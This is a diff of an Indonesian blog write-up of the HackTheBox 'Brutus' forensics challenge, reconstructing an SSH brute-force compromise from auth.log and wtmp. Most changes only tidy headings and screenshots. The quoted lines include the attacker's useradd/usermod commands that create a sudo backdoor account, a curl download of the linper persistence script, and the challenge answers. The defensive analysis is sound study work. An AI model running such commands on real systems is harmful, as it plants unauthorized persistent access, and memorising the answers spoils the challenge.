@@ -27,7 +27,7 @@ artifacts:
   - utmp.py
 ---
 
-## 🔍 Challenge Overview
+## Challenge Overview
 
 **Brutus** adalah challenge forensik yang mengangkat skenario umum di dunia nyata: sebuah server Linux mengalami **brute force attack** via SSH. Setelah berhasil masuk, attacker melakukan serangkaian aktivitas lanjutan yang dapat direkonstruksi melalui analisis log.
 
@@ -41,7 +41,7 @@ artifacts:
 
 ---
 
-## 🗂️ Artifact Overview
+## Artifact Overview
 
 
 ![Articact](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/artifact.png)
@@ -90,7 +90,7 @@ python3 utmp.py -o wtmp.out wtmp
 
 ---
 
-## 🔎 Investigation & Findings
+## Investigation & Findings
 
 ### Task 1 — Attacker IP Address
 
@@ -117,6 +117,8 @@ Mar 06 06:31:35 server sshd[2394]: Failed password for root from 65.2.161.68 por
 
 ### Task 2 — Compromised Account
 
+![Task 2.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task2.1.png)
+
 Indikator keberhasilan brute force adalah adanya log:
 
 ```
@@ -125,11 +127,12 @@ Accepted password for root from 65.2.161.68
 
 Attacker berhasil login sebagai user dengan **privilege tertinggi**.
 
-![Screenshot accepted password task 2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task2.png)
 _Entri "Accepted password" menandakan brute force berhasil_
 
 > **Answer:** `root`
 {: .prompt-tip }
+
+![Task 2.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task2.2.png)
 
 ---
 
@@ -137,11 +140,13 @@ _Entri "Accepted password" menandakan brute force berhasil_
 
 Analisis `wtmp` diperlukan untuk membedakan waktu autentikasi dan waktu sesi terminal aktif secara nyata.
 
-![Screenshot wtmp session timestamp task 3](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task3.png)
-_Waktu sesi interaktif dari hasil parse wtmp_
+![Task 3.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task3.1.png)
 
 > **Answer:** `2024-03-06 06:32:45 UTC`
 {: .prompt-tip }
+
+![Task 3.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task3.2.png)
+
 
 ---
 
@@ -149,11 +154,13 @@ _Waktu sesi interaktif dari hasil parse wtmp_
 
 Setiap koneksi SSH mendapatkan session ID unik yang tercatat di `auth.log`. Session ID digunakan untuk melacak kapan sesi dimulai dan berakhir.
 
-![Screenshot session ID task 4](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task4.png)
+![Task 4.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task4.1.png)
 _Session ID 37 pada entri login root_
 
 > **Answer:** `37`
 {: .prompt-tip }
+
+![Task 4.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task4.2.png)
 
 ---
 
@@ -166,15 +173,19 @@ useradd cyberjunkie
 usermod -aG sudo cyberjunkie
 ```
 
-![Screenshot useradd log task 5](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task5.png)
+![Task 5.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task5.1.png)
 _Log pembuatan user dan penambahan ke grup sudo_
 
 > **Answer:** `cyberjunkie`
 {: .prompt-tip }
 
+![Task 5.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task5.2.png)
+
 ---
 
 ### Task 6 — MITRE ATT&CK Mapping
+
+![Task 6.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task6.1.png)
 
 Pembuatan akun lokal untuk persistence diklasifikasikan sebagai:
 
@@ -184,29 +195,35 @@ Pembuatan akun lokal untuk persistence diklasifikasikan sebagai:
 | Technique | Create Account (`T1136`) |
 | Sub-technique | Local Account |
 
-![Screenshot MITRE mapping task 6](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task6.png)
+![Task 6.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task6.2.png)
 _T1136.001 pada MITRE ATT&CK Enterprise Matrix_
 
 > **Answer:** `T1136.001`
 {: .prompt-tip }
 
+![Task 6.3](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task6.3.png)
 ---
 
 ### Task 7 — End of First SSH Session
 
 Session ID 37 ditutup berdasarkan log `auth.log` pada:
 
-![Screenshot session end task 7](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task7.png)
+![Task 7.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task7.1.png)
 _Entri penutupan sesi SSH ID 37_
 
 > **Answer:** `2024-03-06 06:37:24`
 {: .prompt-tip }
+
+![Task 7.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task7.2.png)
 
 Durasi sesi pertama: ±**4 menit 39 detik** — singkat, konsisten dengan aktivitas otomatisasi.
 
 ---
 
 ### Task 8 — Post Exploitation Activity
+
+![Task 8.1](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task8.1.png)
+_Perintah curl via sudo tercatat di auth.log_
 
 Attacker login kembali menggunakan akun `cyberjunkie`, lalu mengeksekusi perintah via `sudo`:
 
@@ -216,8 +233,7 @@ Attacker login kembali menggunakan akun `cyberjunkie`, lalu mengeksekusi perinta
 
 Script eksternal dari GitHub ini kemungkinan digunakan untuk privilege enumeration, persistence reinforcement, dan lateral movement preparation.
 
-![Screenshot sudo curl command task 8](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task8.png)
-_Perintah curl via sudo tercatat di auth.log_
+![Task 8.2](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/task8.2.png)
 
 > **Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
 {: .prompt-tip }
@@ -225,6 +241,8 @@ _Perintah curl via sudo tercatat di auth.log_
 ---
 
 ## ✅ Kesimpulan
+
+![Achievement](https://cdn.jsdelivr.net/gh/firmansyahdzakwanarifien/firmansyahdzakwanarifien-assets@main/blog/img/projects/task/hackthebox/brutus/close-banner.png)
 
 Challenge **Brutus** membuktikan bahwa investigasi forensik yang efektif tidak selalu membutuhkan tool canggih. Hanya dari dua artefak sederhana — `auth.log` dan `wtmp` — kita mampu merekonstruksi **seluruh rantai serangan** dari awal hingga akhir.
 
